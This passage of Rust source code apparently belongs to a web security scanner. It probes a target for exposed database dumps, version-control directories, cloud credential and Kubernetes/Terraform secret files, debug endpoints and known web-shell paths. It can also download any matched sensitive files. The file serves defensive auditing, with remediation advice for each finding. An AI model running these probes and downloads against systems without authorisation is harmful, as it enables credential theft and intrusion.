            ("/dump.sql.gz", "Gzipped Dump"),
            ("/db.sql.zip", "Zipped SQL"),
            ("/localhost.sql", "Localhost SQL"),
            ("/site.sql", "Site SQL"),
            ("/web.sql", "Web SQL"),
            ("/db.sqlite", "SQLite DB"),
            ("/database.sqlite", "SQLite Full"),
            ("/data.sqlite", "SQLite Data"),
            ("/app.db", "App DB"),
            ("/application.db", "Application DB"),
            ("/data.db", "Data DB"),
            ("/database.db", "Database DB"),
            ("/dbase.db", "Dbase DB"),
            ("/db.mdb", "Access DB"),
            ("/database.mdb", "Access Database"),
            ("/data.mdb", "Access Data"),
            ("/db.mdf", "SQL Server MDF"),
            ("/database.mdf", "SQL Server DB"),
            ("/data.mdf", "SQL Server Data"),
            ("/db.ldf", "SQL Server Log"),
            ("/dump.rdb", "Redis Dump"),
            ("/redis.rdb", "Redis DB"),
            ("/mongodump", "MongoDB Dump"),
            ("/mongodb.dump", "MongoDB Dump 2"),
        ];
        
        for (path, desc) in db_paths {
            self.tests.push(AppTest {
                path: path.to_string(),
                method: "GET".to_string(),
                expected_status: vec![200],
                expected_content: vec!["INSERT".to_string(), "CREATE".to_string(), "TABLE".to_string()],
                severity: Severity::Critical,
                title: format!("Database File Exposed: {}", desc),
                description: format!("Database file {} may contain all application data.", path),
                remediation: "Remove database files from web root. Use proper access controls.".to_string(),
                category: TestCategory::Database,
                download_flag: true,
            });
        }
    }
    
    fn load_vcs_tests(&mut self) {
        let vcs_paths = vec![
            ("/.git", "Git Directory"),
            ("/.git/config", "Git Config"),
            ("/.git/HEAD", "Git HEAD"),
            ("/.git/index", "Git Index"),
            ("/.git/logs/HEAD", "Git Logs"),
            ("/.git/refs/heads/master", "Git Master"),
            ("/.git/refs/heads/main", "Git Main"),
            ("/.svn", "SVN Directory"),
            ("/.svn/entries", "SVN Entries"),
            ("/.svn/wc.db", "SVN WC DB"),
            ("/.svn/all-wcprops", "SVN Props"),
            ("/.hg", "Mercurial Dir"),
            ("/.hg/requires", "Mercurial Req"),
            ("/.bzr", "Bazaar Dir"),
            ("/.cvs", "CVS Dir"),
            ("/CVS/Entries", "CVS Entries"),
            ("/.DS_Store", "DS_Store"),
        ];
        
        for (path, desc) in vcs_paths {
            self.tests.push(AppTest {
                path: path.to_string(),
                method: "GET".to_string(),
                expected_status: vec![200],
                expected_content: vec!["ref".to_string(), "[core]".to_string(), "dir".to_string()],
                severity: Severity::High,
                title: format!("Version Control Exposed: {}", desc),
                description: format!("{} exposes source code repository. May contain credentials.", desc),
                remediation: "Remove VCS directories from production. Add to .gitignore or deploy scripts.".to_string(),
                category: TestCategory::VersionControl,
                download_flag: false,
            });
        }
    }
    
    fn load_cloud_tests(&mut self) {
        let cloud_paths = vec![
            ("/.aws/config", "AWS Config"),
            ("/.aws/credentials", "AWS Credentials"),
            ("/.azure", "Azure Dir"),
            ("/.gcp", "GCP Dir"),
            ("/.google", "Google Dir"),
            ("/gcs.json", "GCS JSON"),
            ("/gcp.json", "GCP JSON"),
            ("/google-cloud.json", "Google Cloud"),
            ("/credentials.json", "Credentials JSON"),
            ("/client_secrets.json", "Client Secrets"),
            ("/client_secret.json", "Client Secret"),
            ("/oauth2.json", "OAuth2"),
            ("/token.json", "Token"),
            ("/access_tokens.db", "Access Tokens"),
            ("/.docker/config.json", "Docker Config"),
            ("/docker-compose.yml", "Docker Compose"),
            ("/docker-compose.yaml", "Docker Compose Alt"),
            ("/.dockerignore", "Docker Ignore"),
            ("/Dockerfile", "Dockerfile"),
            ("/k8s", "K8s Dir"),
            ("/kubernetes", "Kubernetes"),
            ("/kubeconfig", "Kubeconfig"),
            ("/deployment.yaml", "K8s Deployment"),
            ("/service.yaml", "K8s Service"),
            ("/configmap.yaml", "K8s ConfigMap"),
            ("/secrets.yaml", "K8s Secrets"),
            ("/terraform.tfstate", "Terraform State"),
            ("/terraform.tfvars", "Terraform Vars"),
            ("/.terraform", "Terraform Dir"),
            ("/ansible.cfg", "Ansible Config"),
            ("/hosts", "Ansible Hosts"),
            ("/inventory", "Ansible Inventory"),
            ("/group_vars", "Ansible Group Vars"),
            ("/host_vars", "Ansible Host Vars"),
            ("/vault.yml", "Ansible Vault"),
            ("/vault.yaml", "Ansible Vault Alt"),
        ];
        
        for (path, desc) in cloud_paths {
            self.tests.push(AppTest {
                path: path.to_string(),
                method: "GET".to_string(),
                expected_status: vec![200],
                expected_content: vec!["secret".to_string(), "key".to_string(), "token".to_string()],
                severity: Severity::Critical,
                title: format!("Cloud Config Exposed: {}", desc),
                description: format!("Cloud configuration {} may expose cloud credentials.", path),
                remediation: "Remove cloud configs from web root. Use IAM roles/Service Accounts instead.".to_string(),
                category: TestCategory::Cloud,
                download_flag: true,
            });
        }
    }
    
    fn load_dev_tools_tests(&mut self) {
        let dev_paths = vec![
            ("/phpinfo.php", "PHP Info"),
            ("/phpinfo", "PHP Info Alt"),
            ("/info.php", "Info PHP"),
            ("/i.php", "I PHP"),
            ("/p.php", "P PHP"),
            ("/test.php", "Test PHP"),
            ("/tests", "Tests Dir"),
            ("/test", "Test Dir"),
            ("/testing", "Testing Dir"),
            ("/debug", "Debug Dir"),
            ("/debugger", "Debugger"),
            ("/console", "Console"),
            ("/shell", "Shell"),
            ("/php-shell", "PHP Shell"),
            ("/phpshell", "PHPShell"),
            ("/cmd", "CMD"),
            ("/command", "Command"),
            ("/commands", "Commands"),
            ("/scripts", "Scripts"),
            ("/wshell", "WShell"),
            ("/c99.php", "C99 Shell"),
            ("/r57.php", "R57 Shell"),
            ("/shell.php", "Shell PHP"),
            ("/alfa.php", "Alfa Shell"),
            ("/wso.php", "WSO Shell"),
            ("/b374k.php", "B374K Shell"),
            ("/configurator", "Configurator"),
            ("/elmah.axd", "ELMAH"),
            ("/trace.axd", "Trace AXD"),
            ("/swagger", "Swagger"),
            ("/swagger-ui.html", "Swagger UI"),
            ("/swagger.json", "Swagger JSON"),
            ("/v2/swagger.json", "Swagger V2"),
            ("/api/swagger.json", "API Swagger"),
            ("/api-docs", "API Docs"),
            ("/api/docs", "API Docs Alt"),
            ("/apidocs", "API Docs Short"),
            ("/graphql", "GraphQL"),
            ("/graphiql", "GraphiQL"),
            ("/playground", "GraphQL Playground"),
            ("/altair", "Altair"),
            ("/__debug__", "Debug"),
            ("/debug/vars", "Debug Vars"),
            ("/debug/pprof", "Debug Pprof"),
            ("/metrics", "Metrics"),
            ("/actuator", "Spring Actuator"),
            ("/actuator/health", "Actuator Health"),
            ("/actuator/env", "Actuator Env"),
            ("/actuator/configprops", "Actuator Config"),
            ("/actuator/mappings", "Actuator Mappings"),
            ("/actuator/metrics", "Actuator Metrics"),
            ("/actuator/loggers", "Actuator Loggers"),
            ("/actuator/beans", "Actuator Beans"),
            ("/actuator/heapdump", "Actuator Heap Dump"),
            ("/actuator/threaddump", "Actuator Thread Dump"),
            ("/jolokia", "Jolokia"),
        ];
        
        for (path, desc) in dev_paths {
            self.tests.push(AppTest {
                path: path.to_string(),
                method: "GET".to_string(),
                expected_status: vec![200],
                expected_content: vec!["".to_string()],
                severity: if desc.contains("Shell") { Severity::Critical } else { Severity::High },
                title: format!("Dev Tool Exposed: {}", desc),
                description: format!("{} may expose sensitive information or allow code execution.", desc),
                remediation: "Remove development tools from production. Restrict access to debug endpoints.".to_string(),
                category: TestCategory::DevTools,
                download_flag: false,
            });
        }
    }
    
    fn load_api_tests(&mut self) {
        let api_paths = vec![
            ("/api", "API Root"),
            ("/api/v1", "API V1"),
            ("/api/v2", "API V2"),
            ("/api/v3", "API V3"),
            ("/api/v4", "API V4"),
            ("/api/latest", "API Latest"),
            ("/api/internal", "API Internal"),
            ("/api/admin", "API Admin"),
            ("/api/private", "API Private"),
            ("/api/public", "API Public"),
            ("/api/users", "API Users"),
            ("/api/user", "API User"),
            ("/api/auth", "API Auth"),
            ("/api/login", "API Login"),
            ("/api/register", "API Register"),
            ("/api/config", "API Config"),
            ("/api/settings", "API Settings"),
            ("/api/status", "API Status"),
            ("/api/health", "API Health"),
            ("/api/metrics", "API Metrics"),
            ("/api/debug", "API Debug"),
            ("/api/test", "API Test"),
            ("/api/docs", "API Docs"),
            ("/api/documentation", "API Documentation"),
            ("/api/swagger", "API Swagger"),
            ("/api/openapi", "API OpenAPI"),
            ("/rest", "REST"),
            ("/rest/v1", "REST V1"),
            ("/rest/v2", "REST V2"),
            ("/rest/api", "REST API"),
            ("/v1", "V1"),
            ("/v2", "V2"),
            ("/v3", "V3"),
            ("/version", "Version"),
            ("/versions", "Versions"),
        ];
        
        for (path, desc) in api_paths {
            self.tests.push(AppTest {
                path: path.to_string(),
                method: "GET".to_string(),
                expected_status: vec![200],
                expected_content: vec!["".to_string()],
                severity: Severity::Info,
                title: format!("API Endpoint: {}", desc),
                description: format!("API endpoint {} discovered. Review for proper authentication.", path),
                remediation: "Ensure API endpoints require authentication. Implement rate limiting.".to_string(),
                category: TestCategory::Api,
                download_flag: false,
            });
        }
    }
    
    /// Load tests from the encrypted SQLite database
    /// Falls back to CSV loading if the encrypted DB is not available.
    fn load_csv_tests(&mut self) {
        const BRIGHT_GREEN: &str = "\x1B[92m";
        const BRIGHT_WHITE: &str = "\x1B[97m";
        const DIM: &str = "\x1B[2m";
        const RESET: &str = "\x1B[0m";

        let enc_rel = format!("{}/{}", crate::db::DB_DIR, crate::db::DB_ENC_FILE);
        // Try encrypted SQLite database first
        let enc_path = if let Some(p) = self.resolve_db_path(&enc_rel) {
            p
        } else {
            // Fall back to CSV loading
            self.load_csv_tests_fallback();
            return;
        };

        match crate::db::decrypt_and_load(&enc_path) {
            Ok(rows) => {
                let count = rows.len();
                for (path_str, method, status_field, content_indicators,
                     severity_str, category_str, title, description, remediation, download_flag) in rows
                {
                    let expected_status: Vec<u16> = if status_field.is_empty() {
                        vec![200]
                    } else {
                        status_field.split(';')
                            .filter_map(|s| s.trim().parse::<u16>().ok())
                            .collect()
                    };
                    if expected_status.is_empty() {
                        continue;
                    }

                    let expected_content: Vec<String> = if content_indicators.is_empty() {
                        vec![]
                    } else {
                        content_indicators.split(';')
                            .map(|s| s.trim().to_string())
                            .filter(|s| !s.is_empty())
                            .collect()
                    };

                    let severity = match severity_str.as_str() {
                        "Critical" => Severity::Critical,
                        "High" => Severity::High,
                        "Medium" => Severity::Medium,
                        "Low" => Severity::Low,
                        _ => Severity::Info,
                    };

                    let category = match category_str.as_str() {
                        "Cgi" => TestCategory::Cgi,
                        "AdminInterface" | "LegacyAdmin" => TestCategory::AdminInterface,
                        "ConfigFile" | "Config" => TestCategory::ConfigFile,
                        "BackupFile" | "Backup" => TestCategory::BackupFile,
                        "Database" | "Databases" => TestCategory::Database,
                        "VersionControl" | "VCS" => TestCategory::VersionControl,
                        "Cloud" => TestCategory::Cloud,
                        "DevTools" | "CiCd" | "Dev" => TestCategory::DevTools,
                        "Api" | "API" => TestCategory::Api,
                        _ => TestCategory::General,
                    };

                    self.tests.push(AppTest {
                        path: path_str,
                        method,
                        expected_status,
                        expected_content,
                        severity,
                        title,
                        description,
                        remediation,
                        category,
                        download_flag,
                    });
                }
                println!("{BRIGHT_GREEN}[DB-LOADER]{RESET} Loaded {BRIGHT_WHITE}{count}{RESET} tests from encrypted database");
            }
            Err(e) => {
                println!("{DIM}[DB-LOADER] Failed to load encrypted DB: {}{RESET}", e);
                println!("{DIM}[DB-LOADER] Falling back to CSV files...{RESET}");
                self.load_csv_tests_fallback();
            }
        }
    }

    /// Fallback: load tests from individual CSV files
    fn load_csv_tests_fallback(&mut self) {
        use crate::cli::spinner::Spinner;

        const BRIGHT_GREEN: &str = "\x1B[92m";
        const BRIGHT_CYAN: &str = "\x1B[96m";
        const BRIGHT_WHITE: &str = "\x1B[97m";
        const DIM: &str = "\x1B[2m";
        const RESET: &str = "\x1B[0m";
        const CLEAR_LINE: &str = "\x1B[2K\r";

        let csv_base = move |name: &str| format!("{}/csv_source/db_{}", crate::db::DB_DIR, name);
        let csv_files = vec![
            csv_base("tests_small.csv"),
            csv_base("api_microservices.csv"),
            csv_base("cloud_kubernetes.csv"),
            csv_base("cloud_providers.csv"),
            csv_base("devops_cicd.csv"),
            csv_base("infra_databases.csv"),
            csv_base("messaging_queues.csv"),
            csv_base("infra_monitoring.csv"),
            csv_base("modern_web_spa.csv"),
            csv_base("ai_ml.csv"),
            csv_base("supply_chain.csv"),
            csv_base("web3_blockchain.csv"),
            csv_base("serverless_functions.csv"),
            csv_base("legacy_admin.csv"),
            csv_base("network_infra.csv"),
            csv_base("backup_logs.csv"),
            csv_base("config_secrets.csv"),
            csv_base("mobile_backend.csv"),
            csv_base("additional.csv"),
            csv_base("dos_stealth.csv"),
            csv_base("breach_data.csv"),
        ];

        let total_files = csv_files.len();
        let spinner = Spinner::path_spinner();
        let mut total_loaded = 0;
        let mut loaded_files = 0;

        println!("{}[DB-LOADER]{} Starting CSV database load...", BRIGHT_GREEN, RESET);

        let mut missing_files: Vec<&str> = Vec::new();

        for (idx, csv_file) in csv_files.iter().enumerate() {
            let file_name = Path::new(csv_file).file_name()
                .and_then(|n| n.to_str())
                .unwrap_or(csv_file);

            let frame = spinner.next();
            let current = idx + 1;
            let progress = format!(
                "{BRIGHT_GREEN}[{frame}]{RESET} {DIM}Loading{RESET} {BRIGHT_CYAN}[{current}/{total_files}]{RESET} {BRIGHT_WHITE}tests:{RESET} {BRIGHT_GREEN}{total_loaded}{RESET} {file_name}"
            );
            print!("{}{}", CLEAR_LINE, progress);
            std::io::Write::flush(&mut std::io::stdout()).ok();

            match self.load_csv_file(csv_file) {
                Ok(count) => {
                    total_loaded += count;
                    loaded_files += 1;
                }
                Err(_) => {
                    missing_files.push(csv_file);
                }
            }
        }

        print!("{}", CLEAR_LINE);
        if loaded_files == total_files {
            println!("{BRIGHT_GREEN}[DB-LOADER]{RESET} Successfully loaded {BRIGHT_GREEN}{loaded_files}/{total_files}{RESET} CSV databases ({total_loaded} tests)");
        } else {
            println!("{BRIGHT_GREEN}[DB-LOADER]{RESET} Loaded {BRIGHT_GREEN}{loaded_files}/{total_files}{RESET} CSV databases ({total_loaded} tests)");
            if !missing_files.is_empty() {
                println!("{DIM}[DB-LOADER] Missing ({}/{}): {}{RESET}",
                    missing_files.len(), total_files,
                    missing_files.iter()
                        .map(|f| Path::new(f).file_name().and_then(|n| n.to_str()).unwrap_or(f))
                        .collect::<Vec<_>>()
                        .join(", ")
                );
                println!("{DIM}[DB-LOADER] Tip: run from the project root or set OXIDE_DB_DIR=/path/to/{}{RESET}", crate::db::DB_DIR);
            }
        }
    }
    
    /// Resolve database file path — tries multiple locations
    fn resolve_db_path(&self, filepath: &str) -> Option<std::path::PathBuf> {
        // Try as-is first (if running from project root / current working dir)
        let path = Path::new(filepath);
        if path.exists() {
            return Some(path.to_path_buf());
        }

        // Try relative to current working directory explicitly
        if let Ok(cwd) = env::current_dir() {
            let cwd_path = cwd.join(filepath);
            if cwd_path.exists() {
                return Some(cwd_path);
            }
        }

        // Try relative to executable directory and its ancestors
        // Covers: target/debug/oxide -> target/debug/ -> target/ -> project_root/
        if let Ok(exe_path) = env::current_exe() {
            let mut dir = exe_path.parent();
            // Walk up to 4 levels (handles target/debug/, target/release/, etc.)
            for _ in 0..4 {
                if let Some(d) = dir {
                    let candidate = d.join(filepath);
                    if candidate.exists() {
                        return Some(candidate);
                    }
                    dir = d.parent();
                } else {
                    break;
                }
            }
        }

        // Try standard install path (/usr/share/oxide/{db_dir}/)
        let share_path = Path::new("/usr/share/oxide").join(filepath);
        if share_path.exists() {
            return Some(share_path);
        }

        // Try OXIDE_DB_DIR environment variable (explicit override)
        if let Ok(db_dir) = env::var("OXIDE_DB_DIR") {
            let env_path = Path::new(&db_dir).join(Path::new(filepath).file_name()?);
            if env_path.exists() {
                return Some(env_path);
            }
        }

        None
    }

    /// Load tests from a single CSV file using the csv crate
    fn load_csv_file(&mut self, filepath: &str) -> Result<usize> {
        let path = self.resolve_db_path(filepath)
            .ok_or_else(|| anyhow::anyhow!("CSV file not found: {}", filepath))?;

        let file = File::open(&path)?;
        let mut reader = csv::ReaderBuilder::new()
            .has_headers(true)
            .flexible(true)
            .comment(Some(b'#'))  // Skip comment lines starting with #
            .from_reader(file);
        
        let mut count = 0;
        
        for result in reader.records() {
            let record = result?;
            
            if record.len() < 9 {
                continue; // Skip malformed lines
            }
            
            let path_str = record.get(1).unwrap_or("").trim();
            let method = record.get(2).unwrap_or("GET").trim().to_string();
            // Parse status codes (semicolon separated like "200;401;403")
            let status_field = record.get(3).unwrap_or("200").trim();
            let expected_status: Vec<u16> = if status_field.is_empty() {
                vec![200]
            } else {
                status_field.split(';')
                    .filter_map(|s| s.trim().parse::<u16>().ok())
                    .collect()
            };
            if expected_status.is_empty() {
                continue;
            }
            
            let content_indicators = record.get(4).unwrap_or("").trim();
            let severity_str = record.get(5).unwrap_or("Info").trim();
            let category_str = record.get(6).unwrap_or("General").trim();
            let title = record.get(7).unwrap_or("").trim().to_string();
            let description = record.get(8).unwrap_or("").trim().to_string();
            let remediation = record.get(9).unwrap_or("").trim().to_string();
            let download_flag = record.get(10).unwrap_or("false").trim().to_lowercase() == "true";
            
            // Parse severity
            let severity = match severity_str {
                "Critical" => Severity::Critical,
                "High" => Severity::High,
                "Medium" => Severity::Medium,
                "Low" => Severity::Low,
                _ => Severity::Info,
            };
            
            // Parse category
            let category = match category_str {
                "Cgi" => TestCategory::Cgi,
                "AdminInterface" | "LegacyAdmin" => TestCategory::AdminInterface,
                "ConfigFile" | "Config" => TestCategory::ConfigFile,
                "BackupFile" | "Backup" => TestCategory::BackupFile,
                "Database" | "Databases" => TestCategory::Database,
                "VersionControl" | "VCS" => TestCategory::VersionControl,
                "Cloud" => TestCategory::Cloud,
                "DevTools" | "CiCd" | "Dev" => TestCategory::DevTools,
                "Api" | "API" => TestCategory::Api,
                _ => TestCategory::General,
            };
            
            // Parse content indicators (semicolon separated)
            let expected_content: Vec<String> = if content_indicators.is_empty() {
                vec![]
            } else {
                content_indicators.split(';')
                    .map(|s| s.trim().to_string())
                    .filter(|s| !s.is_empty())
                    .collect()
            };
            
            self.tests.push(AppTest {
                path: path_str.to_string(),
                method,
                expected_status,
                expected_content,
                severity,
                title,
                description,
                remediation,
                category,
                download_flag,
            });
            
            count += 1;
        }
        
        Ok(count)
    }
    
    /// Scan a target for all common app vulnerabilities
    pub async fn scan(&self, base_url: &str, download: bool) -> Vec<AppFinding> {
        use crate::scanner::precision;

        let mut findings = Vec::new();
        let base = base_url.trim_end_matches('/');
        let download_dir = if download { Self::create_download_dir(base_url) } else { None };

        let total = self.tests.len();
        let mut hits = 0usize;

        for (idx, test) in self.tests.iter().enumerate() {
            let frame = precision::bidir_braille(idx);
            let line  = precision::cgi_progress_line(idx, total, hits, &test.path, frame);
            print!("{}", line);
            std::io::Write::flush(&mut std::io::stdout()).ok();

            let url = format!("{}{}", base, test.path);

            // Single request — get status AND body together
            if let Some((real_status, body)) = self.fetch_status_and_body(&url, test).await {
                let verdict = precision::validate(
                    real_status,
                    &body,
                    &test.expected_status,
                    &test.expected_content,
                    &test.path,
                );

                if verdict.is_confirmed() {
                    hits += 1;
                    println!(
                        "\n  CGI   {}  \x1B[90mconf {:.0}%  HTTP {}  {}\x1B[0m",
                        test.title,
                        verdict.confidence() * 100.0,
                        real_status,
                        url,
                    );

                    let finding = AppFinding {
                        url: url.clone(),
                        severity: test.severity.clone(),
                        title: test.title.clone(),
                        description: test.description.clone(),
                        evidence: format!(
                            "HTTP {} | confidence {:.0}% | path: {}",
                            real_status, verdict.confidence() * 100.0, test.path
                        ),
                        remediation: test.remediation.clone(),
                        category: test.category.clone(),
                    };

                    if download && test.download_flag {
                        if let Some(ref dir) = download_dir {
                            match self.download_file(&url, test, dir).await {
                                Ok(path) => println!("      \x1B[92m[SAVED]\x1B[0m {}", path.display()),
                                Err(e)   => eprintln!("      \x1B[91m[DL ERR]\x1B[0m {}: {}", url, e),
                            }
                        }
                    }

                    findings.push(finding);
                }
            }

            tokio::time::sleep(Duration::from_millis(5)).await;
        }

        let final_line = precision::cgi_progress_line(total, total, hits, "complete", ">");
        println!("{}", final_line);
        println!("\n\x1B[92m[CGI]\x1B[0m Scan complete -- {} confirmed / {} tests", hits, total);
        findings
    }

    /// Single HTTP request returning (status, body). Returns None on timeout/error.
    async fn fetch_status_and_body(&self, url: &str, test: &AppTest) -> Option<(u16, String)> {
        let result = timeout(self.timeout, async {
            let method = reqwest::Method::from_bytes(test.method.as_bytes()).ok()?;
            let response = self.client.request(method, url).send().await.ok()?;
            let status = response.status().as_u16();
            // Only read body if status matches — saves bandwidth on misses
            if test.expected_status.contains(&status) {
                let body = response.text().await.unwrap_or_default();
                Some((status, body))
            } else {
                None
            }
        }).await;

        match result {
            Ok(Some(pair)) => Some(pair),
            _ => None,
        }
    }

    
    /// Create download directory for sensitive files
    fn create_download_dir(base_url: &str) -> Option<std::path::PathBuf> {
        let domain = base_url
            .replace("http://", "")
            .replace("https://", "")
            .replace("/", "_");
        let dir = std::path::PathBuf::from(format!("downloads/{}_{}", 
            domain, 
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .ok()?
                .as_secs()
        ));
        
        if let Err(e) = std::fs::create_dir_all(&dir) {
            eprintln!("[DOWNLOAD] Failed to create directory: {}", e);
            return None;
        }
        
        Some(dir)
    }
    
    /// Download a sensitive file
    async fn download_file(&self, url: &str, test: &AppTest, dir: &std::path::Path) -> Result<std::path::PathBuf> {
        let response = self.client
            .get(url)
            .send()
            .await?;
        
        let bytes = response.bytes().await?;
        
        // Sanitize filename from path
        let filename = test.path
            .replace('/', "_")
            .replace('\\', "_")
            .replace('?', "_")
            .replace('=', "_")
            .replace('&', "_")
            .trim_start_matches('_')
            .to_string();
        
        let filename = if filename.is_empty() {
            format!("download_{}.bin", std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)?
                .as_secs())
        } else {
            filename
        };
        
        let filepath = dir.join(&filename);
        std::fs::write(&filepath, &bytes)?;
        
        println!("[DOWNLOAD] {} ({} bytes) -> {}", 
            test.title, 
            bytes.len(),
            filepath.display()
        );
        
        Ok(filepath)
    }
    
    /// Get test statistics
    pub fn get_stats(&self) -> HashMap<String, usize> {
        let mut stats = HashMap::new();
        
        for test in &self.tests {
            let cat = format!("{:?}", test.category);
            *stats.entry(cat).or_insert(0) += 1;
        }
        
        stats
    }
}
